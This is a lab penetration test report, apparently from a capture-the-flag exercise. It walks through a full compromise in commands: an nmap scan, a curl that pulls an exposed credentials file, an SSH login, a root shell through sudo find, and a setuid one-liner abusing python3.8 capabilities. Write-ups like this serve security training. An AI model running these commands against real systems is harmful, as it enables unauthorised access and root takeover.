# Lab-Machine-01: Penetration Test Report

## Phase 1: Reconnaissance and Enumeration
Active reconnaissance using Nmap to identify open services and web enumeration to detect hidden directories. 

**Information Disclosure:** Unintentional exposure of internal configuration or directory structures to the public. / Exposición involuntaria de configuración interna o estructuras de directorios al público.

```bash
# Nmap scan to identify open ports (22/SSH, 80/HTTP)
nmap -sV -T4 <IP>

# Retrieve exposed credentials from hidden directory
curl -sL http://<IP>/config_backup/creds.txt -o creds.txt
cat creds.txt
```

## Phase 2: Initial Access
Established initial access vector via SSH utilizing retrieved credentials. Validated user context and retrieved user flag.

```bash
# SSH login with retrieved credentials
ssh admin@<IP>

# Locate and read the user flag
ls -a
cat user.txt
```

## Phase 3: Privilege Escalation (PrivEsc)
**Privilege Escalation:** The act of exploiting a vulnerability or design flaw in an OS to gain higher-level permissions, typically root. / Explotación de una vulnerabilidad o fallo de diseño en un sistema operativo para obtener permisos de nivel superior, generalmente root.

### Vector A: Sudo Misconfiguration
System enumeration to identify binaries that can be executed as root without a password.

```bash
# List allowed sudo commands for the current user
sudo -l

# Exploit NOPASSWD permissions on /usr/bin/find to spawn a root shell
sudo find . -exec /bin/sh \; -quit
```

### Vector B: File Capabilities
**Capabilities:** A set of specific privileges assigned to a process or binary, allowing operations reserved for root, such as modifying UID. / Conjunto de privilegios específicos asignados a un proceso o binario, permitiendo operaciones reservadas para root, como modificar el UID.

```bash
# Search recursively for binaries with active capabilities, discarding errors
getcap -r / 2>/dev/null

# Exploit cap_setuid+ep capability on Python 3.8 to elevate privileges
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Conclusion
* System fully compromised.
* Demonstrated multiple privilege escalation vectors successfully.
